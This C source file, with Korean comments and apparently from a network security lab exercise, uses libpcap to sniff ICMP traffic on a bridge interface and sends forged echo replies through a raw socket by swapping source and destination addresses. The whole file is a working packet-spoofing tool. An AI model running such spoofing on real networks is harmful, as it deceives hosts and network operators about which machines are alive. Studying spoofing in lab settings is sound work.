/*
네트워크 트래픽을 캡처하고 특정 유형의 패킷(이 경우 ICMP 패킷)을 분석한 후 ICMP 패킷을 스푸핑하는 기능
*/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <arpa/inet.h>
#include <pcap.h>

/* Ethernet addresses are 6 bytes */
// 이더넷 주소의 길이(6 바이트)
#define ETHER_ADDR_LEN  6
// 패킷의 최대 길이(1500 바이트)
#define PACKET_LEN   1500

/* Ethernet header */
// 이더넷 헤더 구조체로, 목적지와 출발지의 MAC 주소 및 이더넷 타입을 포함.
struct ethheader {
    u_char  ether_dhost[ETHER_ADDR_LEN];    /* destination host address */
    u_char  ether_shost[ETHER_ADDR_LEN];    /* source host address */
    u_short ether_type;                     /* IP? ARP? RARP? etc */
};

/* IP Header */
//  IP 헤더 구조체로, IP 버전, 헤더 길이, 서비스 타입, 총 길이, 
// 식별자, 플래그, 오프셋, TTL, 프로토콜 타입, 체크섬, 출발지와 목적지 IP 주소를 포함
struct ipheader {
	unsigned char      iph_ihl:4, iph_ver:4; //IP Header length & Version.
	unsigned char      iph_tos; //Type of service
	unsigned short int iph_len; //IP Packet length (Both data and header)
	unsigned short int iph_ident; //Identification
	unsigned short int iph_flag:3, iph_offset:13; //Flags and Fragmentation offset
	unsigned char      iph_ttl; //Time to Live
	unsigned char      iph_protocol; //Type of the upper-level protocol
	unsigned short int iph_chksum; //IP datagram checksum
	struct  in_addr    iph_sourceip; //IP Source address (In network byte order)
	struct  in_addr    iph_destip;//IP Destination address (In network byte order)
};

/* ICMP Header */
// ICMP 헤더 구조체로, ICMP 메시지 타입, 코드, 체크섬, 식별자, 시퀀스 번호를 포함.
struct icmpheader {
	unsigned char icmp_type; //ICMP message type
	unsigned char icmp_code; //Error code
	unsigned short int icmp_chksum; //Checksum for ICMP Header and data
	unsigned short int icmp_id; //Used in echo request/reply to identify request
 	unsigned short int icmp_seq;//Identifies the sequence of echo messages, 
				    //if more than one is sent.
};
// 체크섬 계산 함수
unsigned short in_cksum(unsigned short *buf,int length);
// 원시 IP 패킷 전송 함수
void send_raw_ip_packet(struct ipheader* ip);
// ICMP 스푸핑 함수
void spoof_reply_icmp(struct ipheader* ip);
// 패킷 캡처 시 호출되는 콜백 함수
void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet); 

int count=1;

int main()
{
 	pcap_t *handle; 
	char errbuf[PCAP_ERRBUF_SIZE]; 
	struct bpf_program fp; 
	char filter_exp[] = "icmp"; 
	bpf_u_int32 net;

	// Step 1: Open live pcap session on NIC with interface name
	handle = pcap_open_live("br-80266977d3aa", BUFSIZ, 1, 1000, errbuf);

	// Step 2: Compile filter_exp into BPF psuedo-code 
	pcap_compile(handle, &fp, filter_exp, 0, net); 
	pcap_setfilter(handle, &fp);

	// Step 3: Capture packets 
	pcap_loop(handle, -1, got_packet, NULL);

	pcap_close(handle); //Close the handle 
	return 0;
}

void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *packet) 
{ 
	// 캡처한 패킷에서 이더넷 헤더를 추출
	struct ethheader *eth=(struct ethheader *)packet;
	
	// 이더넷 타입이 IP(0x800)인 경우 IP 헤더를 추출하고 출발지 및 목적지 IP 주소를 출력
	if(ntohs(eth->ether_type) == 0x800)
	{
		printf("Received packet"); 
		struct ipheader *ip = (struct ipheader *)(packet + sizeof(struct ethheader));

		printf("\n---------------------------------------------------\n");
		printf("	From:%s\n",inet_ntoa(ip->iph_sourceip));
		printf("	To:%s\n",inet_ntoa(ip->iph_destip));
		
		switch(ip->iph_protocol) {
		case IPPROTO_TCP:
			printf("	Protocol: TCP\n");
			break;
		case IPPROTO_UDP:
			printf("	Protocol: UDP\n");
			break;
		case IPPROTO_ICMP:
			printf("	Protocol: ICMP\n");
			spoof_reply_icmp(ip);
			printf("	count %d\n", count);
			break;
		default:
			printf("	Protocol: Others\n");
			break;
		}
		printf("\n---------------------------------------------------\n");
	}
	return;
}

void send_raw_ip_packet(struct ipheader* ip)
{
  	struct sockaddr_in dest_info;
  	int enable =1;
  	
  	// Create a raw socket
  	// 원시 소켓을 생성
  	int sock = socket(AF_INET,SOCK_RAW,IPPROTO_RAW);
 	// IP 헤더 포함 옵션을 설정
  	setsockopt(sock,IPPROTO_IP,IP_HDRINCL,&enable,sizeof(enable));
 	
  	// Destination info
  	// 목적지 정보를 설정
  	dest_info.sin_family=AF_INET;
  	dest_info.sin_addr=ip->iph_destip;
	
  	// Send the packet out
  	// 원시 IP 패킷을 전송
  	printf("Sending spoofed IP packet...\n");
  	if(sendto(sock,ip,ntohs(ip->iph_len),0,(struct sockaddr *)&dest_info,sizeof(dest_info)) < 0)
  	{
    		perror("PACKET NOT SENT\n");
    		return;
  	}
  	else
  	{
		printf("\n---------------------------------------------------\n");
		printf("	From:%s\n",inet_ntoa(ip->iph_sourceip));
		printf("	To:%s\n",inet_ntoa(ip->iph_destip));
		printf("\n---------------------------------------------------\n");
  	}
  	close(sock);
}


void spoof_reply_icmp(struct ipheader* ip)
{
	printf("\n---------------------------------------------------\n");
 	int ip_header_len = ip->iph_ihl*4;
 	const char buffer[PACKET_LEN];
 	// 원본 IP 헤더와 ICMP 헤더를 복사하여 새로운 패킷을 생성
 	memset((char*)buffer,0,PACKET_LEN);
 	memcpy((char*)buffer,ip,ntohs(ip->iph_len));

	// Construct icmp header
	// ICMP 응답을 생성하고 체크섬을 계산
 	struct ipheader *newip=(struct ipheader*)buffer;
 	struct icmpheader *newicmp=(struct icmpheader*) (buffer +ip_header_len);
 
	newicmp->icmp_type = 0;  //0 for reply
 	newicmp->icmp_chksum = 0;
 	newicmp->icmp_seq=count++;
 	//newicmp->icmp_chksum=in_cksum((unsigned short *)newicmp, sizeof(struct icmpheader));
 	newicmp->icmp_chksum=in_cksum((unsigned short *)newicmp, ntohs(ip->iph_len)-ip_header_len);
 	//newicmp->icmp_seq=count++;
 
 	// Construct ip header
 	// IP 헤더의 출발지와 목적지 주소를 반대로 설정
 	newip->iph_sourceip=ip->iph_destip;
 	newip->iph_destip=ip->iph_sourceip;
 	newip->iph_ttl=50;
 	newip->iph_len=ip->iph_len;
 
 	//Send Spoofed reply
 	send_raw_ip_packet(newip);
 
}

unsigned short in_cksum(unsigned short *buf,int length)
{
        unsigned short *w = buf;
        int nleft = length;
        int sum = 0;
        unsigned short temp=0;

        /*
        * The algorithm uses a 32 bit accumulator (sum), adds
        * sequential 16 bit words to it, and at the end, folds back all the
        * carry bits from the top 16 bits into the lower 16 bits.
        */
        while (nleft > 1)  {
                sum += *w++;
                nleft -= 2;
        }

        /* treat the odd byte at the end, if any */
        if (nleft == 1) {
                *(u_char *)(&temp) = *(u_char *)w ;
                sum += temp;
        }

        /* add back carry outs from top 16 bits to low 16 bits */
        sum = (sum >> 16) + (sum & 0xffff);     // add hi 16 to low 16 
        sum += (sum >> 16);                     // add carry 
        return (unsigned short)(~sum);
}


